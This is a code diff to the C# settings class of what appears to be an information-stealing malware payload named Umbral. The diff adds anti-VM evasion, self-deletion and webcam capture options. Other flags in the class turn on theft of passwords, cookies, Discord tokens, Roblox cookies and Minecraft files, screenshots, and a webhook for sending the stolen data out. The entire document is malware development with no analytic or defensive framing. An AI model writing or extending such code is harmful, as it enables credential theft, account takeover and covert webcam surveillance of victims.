@@ -13,7 +13,7 @@ namespace Umbral.payload.Config
 
         internal static readonly string Version;
 
-        internal static readonly bool VmProtect;
+        internal static readonly bool AntiVm;
 
         internal static readonly bool Startup;
 
@@ -29,6 +29,10 @@ namespace Umbral.payload.Config
 
         internal static readonly bool TakeScreenshot;
 
+        internal static readonly bool DeleteSelf;
+
+        internal static readonly bool CaptureWebcam;
+
         internal static readonly string Mutex;
 
         static Settings()
@@ -40,7 +44,7 @@ namespace Umbral.payload.Config
             var webhookUrl = "";
             var ping = true; 
             var version = "0.1";
-            var vmProtect = false;
+            var antiVm = false;
             var startup = false;
             var stealPasswords = true;
             var stealCookies = true;
@@ -48,6 +52,8 @@ namespace Umbral.payload.Config
             var stealMinecraftFiles = true;
             var stealDiscordTokens = true;
             var takeScreenshot = true;
+            var deleteSelf = false;
+            var captureWebcam = true;
 
             //--------------------------------------
 
@@ -58,7 +64,7 @@ namespace Umbral.payload.Config
             WebhookUrl = Decrypt(webhookUrl, key, iv);
             Ping = ping;
             Version = Decrypt(version, key, iv);
-            VmProtect = vmProtect;
+            AntiVm = antiVm;
             Startup = startup;
             StealDiscordtokens = stealDiscordTokens;
             StealPasswords = stealPasswords;
@@ -66,6 +72,8 @@ namespace Umbral.payload.Config
             StealRobloxCookies = stealRobloxCookies;
             StealMinecraftFiles = stealMinecraftFiles;
             TakeScreenshot = takeScreenshot;
+            DeleteSelf = deleteSelf;
+            CaptureWebcam = captureWebcam;
             Mutex = mutex;
         }
 
